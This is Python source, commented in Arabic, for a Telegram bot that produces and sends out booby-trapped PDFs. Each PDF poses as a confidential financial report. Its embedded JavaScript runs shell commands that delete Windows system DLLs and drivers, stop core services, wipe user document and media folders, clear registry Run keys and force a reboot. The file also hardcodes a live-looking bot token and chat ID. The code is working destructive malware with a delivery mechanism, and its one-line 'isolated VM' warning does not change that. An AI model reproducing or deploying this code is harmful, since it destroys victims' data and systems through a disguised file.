import os
import time
import requests
import json
import random
from datetime import datetime
from flask import Flask, request
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from io import BytesIO

app = Flask(__name__)

# ============ تكوين البوت ============
TELEGRAM_CONFIG = {
    "TOKEN": "8872991146:AAEGEnOk2AvkKaHgRO7JRJiTSkTGj6CiGRA",
    "CHAT_ID": "7822155315",
    "API_URL": "https://api.telegram.org/bot"
}

# ============ دوال إنشاء PDF ============
def generate_destructive_pdf():
    try:
        packet = BytesIO()
        c = canvas.Canvas(packet)
        c.drawString(100, 750, "📄 تقرير مالي - سري للغاية")
        c.drawString(100, 720, "يُرجى فتح الملف باستخدام Adobe Reader")
        c.drawString(100, 690, "تم التوليد بواسطة: @hkyyykk_bot")
        c.save()
        packet.seek(0)
        new_pdf = PdfReader(packet)
        writer = PdfWriter()
        writer.add_page(new_pdf.pages[0])
        
        destructive_js = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        writer.add_js(destructive_js)
        filename = f"destructive_{int(time.time())}.pdf"
        filepath = os.path.join("/tmp", filename)
        with open(filepath, 'wb') as f:
            writer.write(f)
        return filepath
    except Exception as e:
        print(f"خطأ في توليد PDF: {e}")
        return None

# ============ دوال البوت ============
def send_telegram_message(chat_id, message, reply_markup=None):
    try:
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        if reply_markup:
            data["reply_markup"] = reply_markup
        return requests.post(url, json=data, timeout=10).status_code == 200
    except:
        return False

def send_telegram_file(chat_id, file_path, caption=""):
    try:
        if not os.path.exists(file_path):
            return False
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/sendDocument"
        files = {'document': open(file_path, 'rb')}
        data = {'chat_id': chat_id, 'caption': caption}
        return requests.post(url, files=files, data=data, timeout=30).status_code == 200
    except:
        return False

def generate_keyboard():
    return json.dumps({
        "inline_keyboard": [
            [{"text": "⚒️ توليد PDF تخريبي", "callback_data": "generate_pdf"}],
            [{"text": "📊 الحالة", "callback_data": "status"}, {"text": "❌ إيقاف البوت", "callback_data": "stop_bot"}],
            [{"text": "📖 المساعدة", "callback_data": "help"}]
        ]
    })

def generate_and_send_pdf(chat_id):
    send_telegram_message(chat_id, "⏳ جاري توليد PDF التخريبي...")
    filepath = generate_destructive_pdf()
    if filepath and os.path.exists(filepath):
        caption = "⚒️ تم توليد PDF التخريبي بنجاح! ⚠️ تحذير: هذا الملف يقوم بحذف ملفات النظام وتعطيل الخدمات وإعادة التشغيل. استخدمه فقط في بيئة افتراضية معزولة!"
        if send_telegram_file(chat_id, filepath, caption):
            send_telegram_message(chat_id, "✅ تم إرسال الملف بنجاح!", generate_keyboard())
        else:
            send_telegram_message(chat_id, "❌ فشل إرسال الملف!", generate_keyboard())
        try: os.remove(filepath)
        except: pass
    else:
        send_telegram_message(chat_id, "❌ فشل توليد الملف!", generate_keyboard())

# ============ معالجة الأوامر والكول باك ============
def handle_command(command, chat_id):
    if command == "/start":
        send_telegram_message(chat_id, "🔐 مرحباً بك في بوت توليد PDF التخريبي! اضغط على الزر أدناه.", generate_keyboard())
    elif command == "/generate":
        generate_and_send_pdf(chat_id)
    elif command == "/status":
        send_telegram_message(chat_id, f"🟢 الحالة: يعمل بنجاح\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", generate_keyboard())
    elif command == "/stop" or command == "/kill":
        send_telegram_message(chat_id, "💀 جاري إيقاف البوت...")
        os._exit(0)

def handle_callback(callback_data, chat_id):
    if callback_data == "generate_pdf":
        generate_and_send_pdf(chat_id)
    elif callback_data == "status":
        send_telegram_message(chat_id, f"🟢 الحالة: يعمل بنجاح\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", generate_keyboard())
    elif callback_data == "stop_bot":
        send_telegram_message(chat_id, "💀 جاري إيقاف البوت...")
        os._exit(0)
    elif callback_data == "help":
        send_telegram_message(chat_id, "📋 الأوامر المتاحة:\n/start - القائمة الرئيسية\n/generate - توليد PDF تخريبي\n/status - الحالة\n/stop - إيقاف البوت", generate_keyboard())

# ============ نقطة الـ Webhook ============
@app.route(f'/webhook/{TELEGRAM_CONFIG["TOKEN"]}', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if not data: return "No data", 400
        
        # معالجة الرسائل النصية
        message = data.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        if str(chat_id) == TELEGRAM_CONFIG['CHAT_ID']:
            if 'text' in message:
                handle_command(message['text'], chat_id)
        
        # معالجة الضغط على الأزرار
        callback_query = data.get('callback_query')
        if callback_query:
            chat_id = callback_query['message']['chat']['id']
            if str(chat_id) == TELEGRAM_CONFIG['CHAT_ID']:
                handle_callback(callback_query['data'], chat_id)
        
        return "OK", 200
    except Exception as e:
        print(f"خطأ في webhook: {e}")
        return "Error", 500

@app.route('/')
def home():
    return "✅ Bot is running! Use /start on Telegram."

# ============ تسجيل الـ Webhook ============
def set_webhook():
    try:
        # Render يوفر هذا المتغير البيئي
        hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
        if not hostname:
            print("⚠️ RENDER_EXTERNAL_HOSTNAME غير موجود، سيتم استخدام localhost")
            hostname = "localhost"
        
        webhook_url = f"https://{hostname}/webhook/{TELEGRAM_CONFIG['TOKEN']}"
        url = f"{TELEGRAM_CONFIG['API_URL']}{TELEGRAM_CONFIG['TOKEN']}/setWebhook"
        params = {"url": webhook_url}
        response = requests.post(url, data=params)
        
        if response.status_code == 200 and response.json().get('ok'):
            print(f"✅ Webhook تم تسجيله بنجاح: {webhook_url}")
        else:
            print(f"❌ فشل تسجيل Webhook: {response.text}")
    except Exception as e:
        print(f"❌ خطأ في تسجيل Webhook: {e}")

# ============ تشغيل التطبيق ============
if __name__ == "__main__":
    # تسجيل Webhook عند بدء التشغيل
    set_webhook()
    
    # تشغيل خادم Flask على المنفذ المحدد من Render
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 تشغيل الخادم على المنفذ {port}")
    app.run(host='0.0.0.0', port=port)
